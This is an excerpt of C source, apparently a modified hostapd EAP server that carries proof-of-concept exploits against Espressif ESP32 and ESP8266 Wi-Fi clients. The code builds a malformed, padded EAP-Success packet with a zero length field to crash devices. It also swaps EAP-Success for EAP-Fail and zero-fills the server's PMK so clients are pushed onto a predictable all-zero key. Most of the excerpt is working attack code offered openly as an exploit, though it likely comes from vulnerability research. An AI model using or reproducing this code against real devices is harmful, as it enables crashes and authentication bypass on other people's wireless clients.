...
/* Variable used to indicate wheter the vulnerability was attempted */
int enable_EAP_ESP_BUGS = 0;	   // indicate if the exploit was enabled by the -m 1 argument
int message_fail_skipping = FALSE; // indicate when the exploit was attempted, so wpa_auth.c can print a warn
int enable_crash_esp32_success_padding = 0;
int enable_crash_esp8266_success = 0;
#endif
...
#ifdef EAP_ESP_BUGS
static struct wpabuf *eap_sm_buildSuccess_padded(struct eap_sm *sm, u8 id);
#endif
...
SM_STATE(EAP, METHOD_REQUEST)
{
	...
	sm->eap_if.eapReqData = sm->m->buildReq(sm, sm->eap_method_priv,
											sm->currentId);
#ifdef EAP_ESP_BUGS
	if (enable_crash_esp8266_success || enable_crash_esp32_success_padding)
	{
		// Both crashes use the same code
		sm->eap_if.eapReqData = eap_sm_buildSuccess_padded(sm, sm->currentId);
	}
#endif
...
#ifdef EAP_ESP_BUGS
	if (enable_EAP_ESP_BUGS == 1)
	{
		printf(ANSI_COLOR_YELLOW "EAP Completed\n");
		printf("Pairwise Master Key (PMK) Length: %d\n", (int)sm->eap_if.eapKeyDataLen / 2);
		printf("PMK Received from Radius Server:" ANSI_COLOR_CYAN " 0x");
		for (uint8_t i = 0; i < 32; i++)
		{
			printf("%02X", sm->eap_if.eapKeyData[i]);
		}
		printf(ANSI_COLOR_YELLOW "\n");

		printf("1) Sending EAP-Fail instead of EAP-Success" ANSI_COLOR_CYAN " (CTRL-EVENT-EAP-SUCCESS)\n" ANSI_COLOR_YELLOW);
		sm->eap_if.eapReqData = eap_sm_buildFailure(sm, sm->currentId);

		printf("2) Zero filling server PMK (client should have installed zero PMK also)\n");
		// First 32 bytes from eapKeyData (Master Key) is the PMK
		for (uint8_t i = 0; i < 32; i++)
		{
			sm->eap_if.eapKeyData[i] = 0x00;
		}

		printf("New PMK:" ANSI_COLOR_CYAN " 0x");
		for (uint8_t i = 0; i < 32; i++)
		{
			printf("%02X", sm->eap_if.eapKeyData[i]);
		}
...
static struct wpabuf *eap_sm_buildSuccess_padded(struct eap_sm *sm, u8 id)
{
	...
	msg = wpabuf_alloc(sizeof(*resp) + 2); // allocate 2 extra bytes
	if (msg == NULL)
		return NULL;
	resp = wpabuf_put(msg, sizeof(*resp) + 2); // write 2 extra bytes
	resp->code = EAP_CODE_SUCCESS;
	resp->identifier = 166; // Fix id to certain value (Optional)
	resp->length = 0;		// Size can be any value, even zero
...
void eap_sm_process_nak(struct eap_sm *sm, const u8 *nak_list, size_t len)
{
	...
	wpa_hexdump(MSG_MSGDUMP, "EAP: new list of configured methods",
				(u8 *)sm->user->methods, EAP_MAX_METHODS * sizeof(sm->user->methods[0]));
}
